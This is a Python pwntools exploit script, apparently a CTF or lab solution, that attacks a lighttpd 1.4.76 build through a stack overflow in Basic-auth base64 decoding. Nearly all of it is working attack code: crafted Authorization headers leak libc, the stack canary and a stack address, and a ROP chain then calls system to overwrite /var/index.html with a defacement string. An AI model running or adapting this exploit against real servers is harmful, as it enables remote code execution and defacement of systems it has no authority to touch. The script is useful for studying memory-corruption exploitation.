'''
diff the lighttpd source code (1.4.76) compiled binary with the target binary
a long time later...
found the vulnerability in function `li_base64_dec` triggered by `mod_auth_check_basic` from `mod_auth.c`
the vulnerability is a stack buffer overflow with ability to leak libc, canary and stack address
ROP to call system to write the HACKED to /var/index.html
exp:
1.found the vulnerability
2.determine the overflow length of base64 string
3.leak libc
4.leak canary 
5.leak stack address
6.ROP to call system to write the HACKED to /var/index.html
'''
from pwn import *
from base64 import b64encode


context.arch = 'amd64'
context.log_level = 'debug'

IP   = "192.168.144.43"
PORT = 8080

libc = ELF('./libc.so.6')

def makeRequst(Basic):
    info('Basic length: %d' % (len(Basic)))
    Basic = b64encode(Basic)
    info('Basic b64 length: %d' % (len(Basic)))
    request = "GET /www/ HTTP/1.1\r\n" + \
        f"Host: {IP}:8080\r\n" + \
        "Cache-Control: max-age=0\r\n" + \
        "Authorization: Basic %s\r\n" % (Basic.decode()) + \
        "Upgrade-Insecure-Requests: 1\r\n" + \
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36\r\n" + \
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n" + \
        "Accept-Encoding: gzip, deflate\r\n" + \
        "Accept-Language: zh-CN,zh;q=0.9\r\n" + \
        "Connection: close\r\n" + \
        "\r\n"
    return request.encode()


request2 = makeRequst(Basic = b'C'*0x10 + b'D' * 8)

io = remote(IP, PORT)
io.send(request2)

response = io.recv(4096)
idx = response.find(b'D' * 8)
assert idx >= 0
libcBase = response[idx + 8: idx + 8 + 6] + b'\x00\x00'
libc.address = u64(libcBase) - 0x81989
info('libc base => 0x%x' % libc.address)
io.close()

request1 = makeRequst(Basic = b'A' * 0x400 + b'B' * 9)

io = remote(IP, PORT)
io.send(request1)

response = io.recv(4096)
idx = response.find(b'BBBBBBBBB')
assert idx >= 0

canary = b'\x00' + response[idx + 9: idx + 9 + 7]
canary = u64(canary)

stack = response[idx + 9 + 7: idx + 9 + 7 + 6] + b'\x00\x00'
stack = u64(stack)

info('canary => 0x%x' % canary)
info('stack  => 0x%x' % stack)
# leak stack maybe affected by ASLR and has a low probability of failure
# 1 2 3 4x 5 6 7 8 9 10 11 12 13 14 15 16 17 ... < 1/16
io.close()

payload = flat(
    {
        0x408 : [
            p64(canary),
            p64(0xdeadbeef),
            p64(libc.address + 0x000000000002a3e6), # ret
            p64(libc.address + 0x000000000002a3e5), # pop rdi; ret
            p64(stack - 0x450 + 0x500),             # echo HACK > /var/index.html\x00
            p64(libc.sym['system']),
            p64(0xcafebabe),    
        ],
        0x500  : b'echo HACKEDBYNEBULA > /var/index.html\x00',
    },
    filler=b'\x00'
)
request3 = makeRequst(payload)

io = remote(IP, PORT)
io.send(request3)
print('hacking completed')
# io.interactive()
